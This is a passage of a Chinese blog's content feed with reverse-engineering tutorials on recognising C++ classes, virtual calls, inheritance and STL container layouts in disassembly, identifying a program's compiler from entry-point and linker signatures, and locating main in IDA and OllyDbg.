class="function">CObj <span class="title">g_obj_lpChar</span><span class="params">(<span class="string">&quot;hello World&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_obj_void.Show();</span><br><span class="line">    g_obj_int.Show();</span><br><span class="line">    g_obj_lpChar.Show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// push    offset off_40301C</span></span><br><span class="line"><span class="comment">// push    offset unk_402150</span></span><br><span class="line"><span class="comment">// call    sub_401070</span></span><br><span class="line"><span class="comment">// push    offset off_403020</span></span><br><span class="line"><span class="comment">// push    offset unk_402150</span></span><br><span class="line"><span class="comment">// call    sub_401070</span></span><br><span class="line"><span class="comment">// push    offset off_403018</span></span><br><span class="line"><span class="comment">// push    offset unk_402150</span></span><br><span class="line"><span class="comment">// call    sub_401070</span></span><br><span class="line"><span class="comment">// add     esp, 18h</span></span><br><span class="line"><span class="comment">// xor     eax, eax</span></span><br><span class="line"><span class="comment">// retn</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p><strong><em>使用父类指针(引用)指向子类对象调用虚函数形成了动态联编</em></strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CObj</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;show\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hook_show\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 定义了一个对象直接调用了构造函数，没有产生动态联编</span></span><br><span class="line">    CObj obj; </span><br><span class="line">    <span class="comment">// 对象使用 lea 获取地址</span></span><br><span class="line">    <span class="comment">// lea ecx, dword ptr [ebp-xxx]</span></span><br><span class="line">    <span class="comment">// call show</span></span><br><span class="line">    obj.show();</span><br><span class="line"></span><br><span class="line">    CObj* pObj = &amp;obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用父类指针(引用)指向子类对象调用虚函数形成了动态联编</span></span><br><span class="line">    pObj-&gt;show(); <span class="comment">// 指针使用 Mov 获取指向的内容(地址)</span></span><br><span class="line">    <span class="comment">// mov eax, dword ptr[ebp-xxx]       this</span></span><br><span class="line">    <span class="comment">// mov eax, dword ptr[eax]             虚函数表指针</span></span><br><span class="line">    <span class="comment">// mov eax, dword ptr[eax+4*0]       虚函数</span></span><br><span class="line">    <span class="comment">// mov ecx, dword ptr[ebp-xxx]       this</span></span><br><span class="line">    <span class="comment">// call eax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="继承和多重继承"><a href="#继承和多重继承" class="headerlink" title="继承和多重继承"></a>继承和多重继承</h2><ul>
+<li><p><strong><em>识别类和类之间的关系</em></strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBase</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CBase()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CBase&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ~CBase()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;~CBase&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SetNumber</span><span class="params">(<span class="keyword">int</span> nNumber)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        m_nBase = nNumber;</span><br><span class="line">        <span class="comment">// mov     eax, [ebp+var_8]     ; 还原 this 指针</span></span><br><span class="line">        <span class="comment">// mov     ecx, [ebp+arg_0]     ; ecx 得到参数</span></span><br><span class="line">        <span class="comment">// mov     [eax], ecx           ; 这里的 [eax] 相当于 [this + 0]，参考内存结构，是父类成员 m_nBase</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetNumber</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_nBase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m_nBase;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTest</span> :</span> <span class="keyword">public</span> CBase</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ; CTest::CTest 提供的默认构造</span><br><span class="line">    <span class="comment">// pop     ecx                  ; 还原 this 指针</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_8], ecx</span></span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+var_8]     ; 以子类对象首地址作为父类的this指针，调用父类构造函数</span></span><br><span class="line">    <span class="comment">// call    sub_41119A</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+var_8]</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ShowNumber</span><span class="params">(<span class="keyword">int</span> nNumber)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SetNumber(nNumber);</span><br><span class="line">        <span class="comment">// mov     eax, [ebp+arg_0]     ; 访问参数 nNumber 并保存到 eax 中</span></span><br><span class="line">        <span class="comment">// push    eax</span></span><br><span class="line">        <span class="comment">// mov     ecx, [ebp+var_8]     ; 由于 this 指针同时也是对象中父类部分的首地址，因此在调用父类成员函数时，this 指针的值和子类对象等同</span></span><br><span class="line">        <span class="comment">// call    sub_41102D</span></span><br><span class="line">        </span><br><span class="line">        m_nTest = nNumber + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// mov     eax, [ebp+arg_0]     </span></span><br><span class="line">        <span class="comment">// add     eax, 1</span></span><br><span class="line">        <span class="comment">// mov     ecx, [ebp+var_8]     ; ecx 获得 this 指针</span></span><br><span class="line">        <span class="comment">// mov     [ecx+4], eax         ; 子类成员 m_nTest 的地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, GetNumber());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, m_nTest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m_nTest;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CTest test;</span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_1C]    ; 获取对象首地址作为 this 指针</span></span><br><span class="line">    <span class="comment">// call    sub_411172           ; 调用类 CTest 的构造函数，编译器提供了默认的构造函数</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_4], 0</span></span><br><span class="line">    </span><br><span class="line">    test.ShowNumber(argc);</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+argc]</span></span><br><span class="line">    <span class="comment">// push    eax</span></span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_1C]    ; 调用 CTest 成员函数，传入 this 指针</span></span><br><span class="line">    <span class="comment">// call    sub_411320</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_E8], 0</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_4], 0FFFFFFFFh</span></span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_1C]</span></span><br><span class="line">    <span class="comment">// call    sub_411064           ; 调用类 CTest 的析构函数，编译器提供了默认的析构函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPerson</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CPerson() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~CPerson() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ShowSpeak</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CChinese</span> :</span> <span class="keyword">public</span> CPerson</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CChinese() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~CChinese() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ShowSpeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Speak Chinese&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CAmerican</span> :</span> <span class="keyword">public</span> CPerson</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CAmerican() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~CAmerican() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ShowSpeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Speak American&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CGerman</span> :</span> <span class="keyword">public</span> CPerson</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CGerman() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~CGerman() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ShowSpeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Speak German&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Speak</span><span class="params">(CPerson *pPerson)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pPerson-&gt;ShowSpeak();</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+arg_0]     ; eax 获取参数 pPerson的值</span></span><br><span class="line">    <span class="comment">// mov     edx, [eax]           ; 取虚表首地址并传递给 edx</span></span><br><span class="line">    <span class="comment">// mov     esi, esp</span></span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+arg_0]     ; 设置 this 指针</span></span><br><span class="line">    <span class="comment">// mov     eax, [edx+4]</span></span><br><span class="line">    <span class="comment">// call    eax                  ; 利用虚表指针edx，间接调用函数，第一个声明的虚函数是析构函数，第二个声明的虚函数是ShowSpeak，所以ShowSpeak在虚表的位置排第二，[edx+4] 即 ShowSpeak 的函数地址</span></span><br><span class="line">    <span class="comment">// cmp     esi, esp</span></span><br><span class="line">    <span class="comment">// call    j___RTC_CheckEsp</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CChinese chinese;</span><br><span class="line">    CAmerican american;</span><br><span class="line">    CGerman german;</span><br><span class="line">    Speak(&amp;chinese);</span><br><span class="line">    Speak(&amp;american);</span><br><span class="line">    Speak(&amp;german);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+</li>
+</ul>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
+<li>静态函数没有this指针，没有ecx传参</li>
+<li>静态函数的两种调用在反汇编都是一样的</li>
+<li>友元函数一般参数都某个对象，或对象指针</li>
+<li>访问或者修改成员变量，一般都是使用this指针加上偏移来实现</li>
+<li>获取成员变量的函数，一般返回值是从this指针指向的内存空间中获取</li>
+<li>设置成员变量的函数，一般参数传递进去之后会修改 this 指针所指向的内存空间</li>
+</ul>
+<h1 id="数据结构的逆向"><a href="#数据结构的逆向" class="headerlink" title="数据结构的逆向"></a>数据结构的逆向</h1><h2 id="字符串对象-CString"><a href="#字符串对象-CString" class="headerlink" title="字符串对象 CString"></a>字符串对象 CString</h2><ul>
+<li><p>CString 大小是4字节，初始化会依赖两个函数，初始化空间+构造函数</p>
+<p><img data-src="/images/asm/6.png"></p>
+</li>
+</ul>
+<h2 id="字符串对象-string"><a href="#字符串对象-string" class="headerlink" title="字符串对象 string"></a>字符串对象 string</h2><ul>
+<li><p>string 大小是 28字节，其中的第二个元素是一个联合体，当字符串长度大于15时，会存在一个指针，指向实际的字符串</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_string</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_string</span>* <span class="title">self</span>;</span>        <span class="comment">// 指向自己的指针</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span>* ptr;                <span class="comment">// 当数据大于15字节的时候</span></span><br><span class="line">        <span class="keyword">char</span> str[<span class="number">0x10</span>];            <span class="comment">// 当数据小于16字节的时候</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> length;                    <span class="comment">// 当前占用的长度</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>;                    <span class="comment">// 指向的堆空间的大小(最多能存储多少)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="vector-对象"><a href="#vector-对象" class="headerlink" title="vector 对象"></a>vector 对象</h2><ul>
+<li><p>vector 占用的大小是16字节，初始化使用两个函数，分别是分配空间函数和构造函数</p>
+</li>
+<li><p>第一个字段是一个指向自己的指针</p>
+</li>
+<li><p>第二个字段直接指向数据的数组</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">my_vector</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_vector</span>* <span class="title">self</span>;</span>        <span class="comment">// 指向自己</span></span><br><span class="line">    T* <span class="built_in">begin</span>;                    <span class="comment">// 指向堆空间起始位置</span></span><br><span class="line">    T* data_end;                <span class="comment">// 指向数据的结尾部分</span></span><br><span class="line">    T* heap_end;                <span class="comment">// 指向堆空间的结尾</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="list-对象"><a href="#list-对象" class="headerlink" title="list 对象"></a>list 对象</h2><ul>
+<li><p>list 是一个双向循环链表，占用了 0x0C的空间，分别保存了自己的地址，头节点的地址以及元素的个数</p>
+</li>
+<li><p>第一个字段是一个指向自己的指针</p>
+</li>
+<li><p>第二个字段是头节点</p>
+</li>
+<li><p>第三个字段存放元素个数</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">my_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_node</span>* <span class="title">next</span>;</span>        <span class="comment">// 指向下一个</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_node</span>* <span class="title">prev</span>;</span>        <span class="comment">// 指向前一个</span></span><br><span class="line">    T element;                    <span class="comment">// 数据域</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器结构体</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">my_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_list</span>* <span class="title">self</span>;</span>        <span class="comment">// 指向自己的指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_node</span>&lt;T&gt;* <span class="title">head</span>;</span>    <span class="comment">// 头节点，不存储数据</span></span><br><span class="line">    <span class="keyword">int</span> length;                    <span class="comment">// 元素个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><ul>
+<li><p>迭代器占用了 12 字节空间，第一个指针指向了一个结构体，保存了自己的地址，又保存了被关联容器的地址</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* target;        <span class="comment">// 指向的类型是不固定</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_iterator</span>* <span class="title">self</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_iterator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">s</span>* <span class="title">point</span>;</span>            <span class="comment">// 自己和关联的容器</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_iterator</span>* <span class="title">prev</span>;</span>    <span class="comment">// 前一个迭代器</span></span><br><span class="line">    <span class="keyword">void</span>* node;                    <span class="comment">// 具体的的节点</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h1 id="MFC-程序的逆向"><a href="#MFC-程序的逆向" class="headerlink" title="MFC 程序的逆向"></a>MFC 程序的逆向</h1><ul>
+<li><p>调用堆栈窗口，提取特征码</p>
+<ul>
+<li>不同版本的 VS 对应的特征码不同，所以需要自己分析，不同的事件对应的特征码也是不同</li>
+</ul>
+<p><img data-src="/images/asm/7.png"></p>
+</li>
+<li><p>在OD中右键 –&gt;  查找 –&gt; 所有命令</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>不同语言程序的特征</title>
+    <url>/%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%89%B9%E5%BE%81.html</url>
+    <content><![CDATA[<h1 id="如何确定目标程序的语言"><a href="#如何确定目标程序的语言" class="headerlink" title="如何确定目标程序的语言"></a>如何确定目标程序的语言</h1><ul>
+<li>入口点的特征（二进制特征）</li>
+<li>链接器版本</li>
+<li>区段的名称</li>
+</ul>
+<a id="more"></a>
+
+
+
+<h2 id="BC-程序"><a href="#BC-程序" class="headerlink" title="BC++程序"></a>BC++程序</h2><ul>
+<li>入口点特征（一个短跳转，跳过了一个固定的字符串<code>fb:C++HOOK</code>，并且第一个调用的函数是<code>GetModuleHandleA</code>）</li>
+</ul>
+<p><img data-src="/images/language/1.png"></p>
+<ul>
+<li>BC++编写的程序，调用IAT函数会使用到 FF25</li>
+</ul>
+<p><img data-src="/images/language/2.png"></p>
+<ul>
+<li>链接器版本：5.0</li>
+</ul>
+<p><img data-src="/images/language/3.png"></p>
+<ul>
+<li>二进制特征，后面会有 <code>GetModuleHandle</code> 函数的调用</li>
+</ul>
+<p><img data-src="/images/language/10.png"></p>
+<ul>
+<li>区段的特征：不同功能对应的数据放置在相应的区段中</li>
+</ul>
+<p><img data-src="/images/language/4.png"></p>
+<h2 id="Delphi程序"><a href="#Delphi程序" class="headerlink" title="Delphi程序"></a>Delphi程序</h2><ul>
+<li>入口特征 （入口处存在5个call，第一个call的内部调用了<code>GetModuleHandle</code>函数）</li>
+</ul>
+<p><img data-src="/images/language/5.png"></p>
+<p><img data-src="/images/language/6.png"></p>
+<ul>
+<li>因为Delphi和BC++程序都是宝蓝公司的，所以IAT调用特征相同</li>
+<li>链接器版本：2.25</li>
+</ul>
+<p><img data-src="/images/language/7.png"></p>
+<ul>
+<li>二进制特征：B8和E8后面都是不同的，可以使用？？代替</li>
+</ul>
+<p><img data-src="/images/language/8.png"></p>
+<ul>
+<li>区段特征：代码段和数据段以及未初始化的数据</li>
+</ul>
+<p><img data-src="/images/language/9.png"></p>
+<h2 id="汇编程序"><a href="#汇编程序" class="headerlink" title="汇编程序"></a>汇编程序</h2><ul>
+<li>特征：小，入口点直接就是逻辑代码</li>
+</ul>
+<p><img data-src="/images/language/11.png"></p>
+<ul>
+<li>链接器版本：5.12</li>
+</ul>
+<p><img data-src="/images/language/12.png"></p>
+<h2 id="VC6-0"><a href="#VC6-0" class="headerlink" title="VC6.0"></a>VC6.0</h2><ul>
+<li>入口点特征：</li>
+</ul>
+<p><img data-src="/images/language/13.png"></p>
+<ul>
+<li>链接器版本：6.0</li>
+</ul>
+<p><img data-src="/images/language/14.png"></p>
+<ul>
+<li>区段特征</li>
+</ul>
+<p><img data-src="/images/language/15.png"></p>
+<ul>
+<li>二进制特征：</li>
+</ul>
+<p><img data-src="/images/language/16.png"></p>
+<h2 id="易语言"><a href="#易语言" class="headerlink" title="易语言"></a>易语言</h2><ul>
+<li>入口点特征：</li>
+</ul>
+<p><img data-src="/images/language/17.png"></p>
+<ul>
+<li>链接器版本：6.0</li>
+</ul>
+<p><img data-src="/images/language/18.png"></p>
+<ul>
+<li>区段特征：</li>
+</ul>
+<p><img data-src="/images/language/19.png"></p>
+<ul>
+<li>二进制特征：</li>
+</ul>
+<p><img data-src="/images/language/20.png"></p>
+<h2 id="VS-程序的链接器版本对应的VS版本"><a href="#VS-程序的链接器版本对应的VS版本" class="headerlink" title="VS 程序的链接器版本对应的VS版本"></a>VS 程序的链接器版本对应的VS版本</h2><table>
+<thead>
+<tr>
+<th align="center">VS 版本</th>
+<th align="center">链接器版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">VC 6.0</td>
+<td align="center">6.0</td>
+</tr>
+<tr>
+<td align="center">VC2003</td>
+<td align="center">7.0 / 7.1</td>
+</tr>
+<tr>
+<td align="center">VS2005</td>
+<td align="center">8.0</td>
+</tr>
+<tr>
+<td align="center">VS2008</td>
+<td align="center">9.0</td>
+</tr>
+<tr>
+<td align="center">VS2010</td>
+<td align="center">10.0</td>
+</tr>
+<tr>
+<td align="center">VS2012</td>
+<td align="center">11.0</td>
+</tr>
+<tr>
+<td align="center">VS2013</td>
+<td align="center">12.0</td>
+</tr>
+<tr>
+<td align="center">VS2015</td>
+<td align="center">14.0</td>
+</tr>
+<tr>
+<td align="center">VS2017</td>
+<td align="center">14.1</td>
+</tr>
+<tr>
+<td align="center">VS2019</td>
+<td align="center">14.2</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>寻找main函数</title>
+    <url>/%E5%AF%BB%E6%89%BEmain%E5%87%BD%E6%95%B0.html</url>
+    <content><![CDATA[<ul>
+<li>对于想要逆向入门的小伙伴来说，第一步的踏出总是非常艰难的，直接把程序扔进OD里的话，一串串的汇编指令，单个看还是理解的，放在一起就不认识了，接下来我带大家踏出这第一步，也是非常重要的一步，寻找main函数</li>
+</ul>
+<a id="more"></a>
+
+
+
+<ul>
+<li>接下来我带大家去深入一下</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们在 return 的地方下断点，看它的反汇编和堆栈窗口，在反汇编窗口的ret地方下断点</li>
+</ul>
+<p><img data-src="/images/main/1.png"></p>
+<ul>
+<li>使用F11单步，在调用堆栈中，可以看到在main函数调用之前，还有三个函数的调用</li>
+</ul>
+<p><img data-src="/images/main/2.png"></p>
+<ul>
+<li>可以看到，最底层的是 <code>mainCRTStartup() </code> –&gt; <code>     __scrt_common_main()</code> –&gt; <code>__scrt_common_main_seh()</code>  –&gt; <code>invoke_main()</code></li>
+<li>我们双击进去看一下它们的源码</li>
+</ul>
+<p><img data-src="/images/main/3.png"></p>
+<p><img data-src="/images/main/4.png"></p>
+<p><img data-src="/images/main/5.png"></p>
+<p><img data-src="/images/main/6.png"></p>
+<ul>
+<li>可以看到main函数是最后才被调用的，那什么是 <code>mainCRTStartup() </code>呢？它是c运行时库的入口点</li>
+<li>源码感兴趣的小伙伴可以自己分析一下，接下来步入正题，如何查找main函数</li>
+</ul>
+<h2 id="IDA查找main函数"><a href="#IDA查找main函数" class="headerlink" title="IDA查找main函数"></a>IDA查找main函数</h2><ul>
+<li>这里用到的程序是刚才那个，打印一个 hello world，使用的是vs2017编写的 debug版本的程序</li>
+<li>首先，将它拖入 IDA 中，打开 exports，选择 start</li>
+</ul>
+<p><img data-src="/images/main/7.png"></p>
+<ul>
+<li>可以看到有一个 <code>jmp</code> ，我们跳转进去</li>
+</ul>
+<p><img data-src="/images/main/8.png"></p>
+<ul>
+<li>发现了什么，<code>__scrt_common_main()</code> ，这不就是我们之前在堆栈中看到的函数吗</li>
+</ul>
+<p><img data-src="/images/main/9.png"></p>
+<ul>
+<li>继续跟进去，可以看到 <code>__scrt_common_main_seh()</code> 函数，我们选择第二个 call，进入这个函数</li>
+</ul>
+<p><img data-src="/images/main/10.png"></p>
+<ul>
+<li>这个里边就是 <code>__scrt_common_main_seh()</code> 内部了</li>
+</ul>
+<p><img data-src="/images/main/11.png"></p>
+<ul>
+<li>这里我们也没有必要一步一步去分析它的代码，我会告诉大家比较快的办法，我们主要看的部分大概在这个位置</li>
+</ul>
+<p><img data-src="/images/main/12.png"></p>
+<ul>
+<li>可以看到两个 <code>j_cexit</code> </li>
+</ul>
+<p><img data-src="/images/main/13.png"></p>
+<ul>
+<li>在它上边会有三个 call，我们选择中间的那个 call</li>
+</ul>
+<p><img data-src="/images/main/14.png"></p>
+<ul>
+<li>进去后选择最后一个call，前三个call都是在给他传参，最后一个就是main函数</li>
+</ul>
+<p><img data-src="/images/main/15.png"></p>
+<ul>
+<li>这里还有一个<code>jmp</code>跳转，我们进去后就是main函数</li>
+</ul>
+<p><img data-src="/images/main/16.png"></p>
+<ul>
+<li>到这里，IDA中寻找main函数就完成了，接下来看一下OD中怎么寻找main函数</li>
+</ul>
+<h2 id="OD查找main函数"><a href="#OD查找main函数" class="headerlink" title="OD查找main函数"></a>OD查找main函数</h2><ul>
+<li>这里继续用刚才那个程序</li>
+<li>查找main函数有一种方法：<ul>
+<li>MFC程序：查找四个push一个call</li>
+<li>C++程序：查找三个push一个call / debug版本，还可以查找三个call，选择中间那个call</li>
+</ul>
+</li>
+<li>这里的流程和刚才在IDA中的基本一致，将程序拖入进去后，选择第一个跳转</li>
+</ul>
+<p><img data-src="/images/main/17.png"></p>
+<ul>
+<li>进去后选择第一个call</li>
+</ul>
+<p><img data-src="/images/main/18.png"></p>
+<ul>
+<li>这里选择的是 两个call中的第二个call</li>
+</ul>
+<p><img data-src="/images/main/19.png"></p>
+<ul>
+<li>由于这是vs2017编写的程序，所有我们需要找三个相连的call，并选择中间的call</li>
+</ul>
+<p><img data-src="/images/main/20.png"></p>
+<ul>
+<li>这里选择最后一个，和IDA中一样，前三个都是在给main传参</li>
+</ul>
+<p><img data-src="/images/main/21.png"></p>
+<ul>
